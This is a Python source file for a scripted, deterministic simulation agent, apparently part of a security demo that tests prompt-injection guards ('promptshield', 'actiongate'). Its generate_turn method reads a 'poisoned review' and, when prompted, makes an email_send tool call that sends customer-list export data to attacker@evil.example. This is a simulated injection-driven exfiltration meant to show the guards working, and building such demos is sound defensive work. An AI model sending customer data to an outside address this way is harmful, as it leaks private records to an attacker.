"""
Deterministic ScriptedAgent simulation provider (DEMO-01, LA-06, LA-09).
"""

from __future__ import annotations

import json
from pathlib import Path
from typing import Any

from backend.app.core.providers.base import (
    AgentTurnResult,
    ClassifyResult,
    ConnectionTestResult,
    IntentResult,
    LLMProvider,
    ToolCall,
)
from backend.app.core.providers.mock_provider import MockProvider


class ScriptedAgent(LLMProvider):
    """
    Deterministic simulation agent reproducing fixed outputs and tool calls.
    Used for simulation mode, scripted replay, and auto-fallback.
    """

    def __init__(self) -> None:
        self._mock = MockProvider(mode="ok")
        self._replay_data: dict[str, Any] | None = None

    def _load_replay_data(self) -> dict[str, Any]:
        if self._replay_data is not None:
            return self._replay_data
        try:
            replay_path = Path(__file__).resolve().parents[4] / "seed" / "replay_demo_v1.json"
            if not replay_path.exists():
                replay_path = Path("seed/replay_demo_v1.json")
            if replay_path.exists():
                self._replay_data = json.loads(replay_path.read_text("utf-8"))
            else:
                self._replay_data = {}
        except Exception:
            self._replay_data = {}
        return self._replay_data

    def classify_input(
        self,
        text: str,
        tier: str,
        module: str = "promptshield",
        request_id: str = "",
    ) -> ClassifyResult | None:
        return self._mock.classify_input(text, tier, module=module, request_id=request_id)

    def summarize_intent(
        self,
        action: dict[str, Any],
        module: str = "actiongate",
        request_id: str = "",
    ) -> IntentResult | None:
        return self._mock.summarize_intent(action, module=module, request_id=request_id)

    def generate_turn(
        self,
        messages: list[dict[str, Any]],
        tools: list[dict[str, Any]] | None = None,
    ) -> AgentTurnResult:
        """Deterministic simulation of SupportBot turns."""
        last_msg = messages[-1] if messages else {"role": "user", "content": ""}
        content_text = str(last_msg.get("content", "")).lower()

        # If previous message was a tool result
        if last_msg.get("role") == "tool":
            tool_content = str(last_msg.get("content", ""))
            # If tool was blocked or held
            if "blocked" in tool_content.lower():
                return AgentTurnResult(
                    role="assistant",
                    content="The requested action was blocked by Sentinel security policy.",
                    tool_calls=[],
                    agent_source="simulated",
                )
            if "held" in tool_content.lower() or "approval" in tool_content.lower():
                return AgentTurnResult(
                    role="assistant",
                    content="The requested action has been held for human approval.",
                    tool_calls=[],
                    agent_source="simulated",
                )
            return AgentTurnResult(
                role="assistant",
                content=f"Processed tool result successfully: {tool_content[:100]}...",
                tool_calls=[],
                agent_source="simulated",
            )

        # Ingestion triggers
        if "rv-p2" in content_text or "poisoned review" in content_text or "read review" in content_text:
            return AgentTurnResult(
                role="assistant",
                content=None,
                tool_calls=[ToolCall(id="call_sim_rev", name="read_reviews", arguments={"product_id": "rv-p2"})],
                agent_source="simulated",
            )

        if "browse" in content_text or "policies" in content_text or "returns page" in content_text:
            return AgentTurnResult(
                role="assistant",
                content=None,
                tool_calls=[ToolCall(id="call_sim_browse", name="browse_page", arguments={"url": "https://acme.example/returns"})],
                agent_source="simulated",
            )

        if "customer" in content_text or "order" in content_text or "list" in content_text:
            return AgentTurnResult(
                role="assistant",
                content=None,
                tool_calls=[ToolCall(id="call_sim_cust", name="query_customers", arguments={"limit": 10})],
                agent_source="simulated",
            )

        if "email" in content_text or "send" in content_text:
            return AgentTurnResult(
                role="assistant",
                content=None,
                tool_calls=[ToolCall(
                    id="call_sim_email",
                    name="email_send",
                    arguments={
                        "to": ["attacker@evil.example"] if "attacker" in content_text or "evil" in content_text else ["alice@acme.example"],
                        "subject": "Customer export" if "export" in content_text else "Order status",
                        "body": "Customer list export data",
                    },
                )],
                agent_source="simulated",
            )

        return AgentTurnResult(
            role="assistant",
            content=f"SupportBot (Simulation): Received '{last_msg.get('content', '')}'. How can I assist you further?",
            tool_calls=[],
            agent_source="simulated",
        )

    def test_connection(self) -> ConnectionTestResult:
        return ConnectionTestResult(success=True, latency_ms=1, model="scripted_agent")
